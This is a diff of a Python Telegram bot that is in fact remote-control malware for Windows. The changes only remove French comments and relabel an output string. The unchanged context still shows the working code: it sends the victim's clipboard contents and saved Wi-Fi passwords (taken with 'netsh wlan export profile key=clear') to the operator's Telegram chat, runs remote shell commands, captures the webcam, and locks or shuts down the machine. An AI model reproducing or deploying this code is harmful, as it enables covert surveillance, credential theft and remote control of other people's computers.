@@ -172,7 +172,7 @@ def decrypt_folder(message):
 @bot.message_handler(commands=['lock'])
 def lock_command(message):
     try:
-        # Utiliser la commande pour verrouiller la session Windows
+ 
         result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         
         if result.returncode == 0:
@@ -184,7 +184,6 @@ def lock_command(message):
 
 
 
-# Liste de variantes de commande d'extinction
 shutdown_commands = [
     ['shutdown', '/s', '/t', '5'],
     ['shutdown', '-s', '-t', '5'],
@@ -244,11 +243,11 @@ def capture_webcam_image(message):
 @bot.message_handler(commands=['speech'])
 def text_to_speech_command(message):
     try:
-        # Extraire le texte après la commande /speech
+     
         text = message.text.replace('/speech', '').strip()
         
         if text:
-            # Convertir et lire le texte
+        
             pyttsx3.speak(text)
             bot.send_message(message.chat.id, "Texte converti en discours et lu avec succès.")
         else:
@@ -260,11 +259,11 @@ def text_to_speech_command(message):
 @bot.message_handler(commands=['clipboard'])
 def clipboard_command(message):
     try:
-        # Obtenez le contenu actuel du presse-papiers
+       
         clipboard_text = clipboard.paste()
 
         if clipboard_text:
-            # Envoyez le contenu du presse-papiers au chat
+          
             bot.send_message(message.chat.id, f"Contenu du presse-papiers :\n{clipboard_text}")
         else:
             bot.send_message(message.chat.id, "Le presse-papiers est vide.")
@@ -272,10 +271,10 @@ def clipboard_command(message):
         bot.send_message(message.chat.id, f"Une erreur s'est produite : {str(e)}")
 
 
-# Dictionnaire pour suivre l'état de chaque utilisateur
+
 user_states = {}
 
-# États possibles
+
 STATE_NORMAL = 1
 STATE_SHELL = 2
 
@@ -332,9 +331,9 @@ def handle_shell_commands(message):
         except Exception as e:
             bot.send_message(user_id, f"An error occurred: {str(e)}")
 
-# Fonction pour envoyer un message long en plusieurs parties
+
 def send_long_message(user_id, message_text):
-    part_size = 4000  # Taille maximale de chaque partie
+    part_size = 4000 
     message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]
 
     for part in message_parts:
@@ -344,14 +343,14 @@ def send_long_message(user_id, message_text):
 @bot.message_handler(commands=['wifi'])
 def get_wifi_passwords(message):
     try:
-        # Exécute la commande pour exporter les profils Wi-Fi en XML
+        
         subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
 
-        # Lit le fichier XML généré
+
         with open('Wi-Fi-App.xml', 'r') as file:
             xml_content = file.read()
 
-        # Utilise des expressions régulières pour extraire le SSID et le mot de passe
+    
         ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
         password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
 
@@ -359,8 +358,8 @@ def get_wifi_passwords(message):
             ssid = ssid_match.group(1)
             password = password_match.group(1)
 
-            # Envoie les informations au format demandé à l'utilisateur sur Telegram
-            message_text = f"SSID: {ssid}\nMDP: {password}"
+          
+            message_text = f"SSID: {ssid}\nPASS: {password}"
             bot.send_message(message.chat.id, message_text)
         else:
             bot.send_message(message.chat.id, "NOT FOUND.")
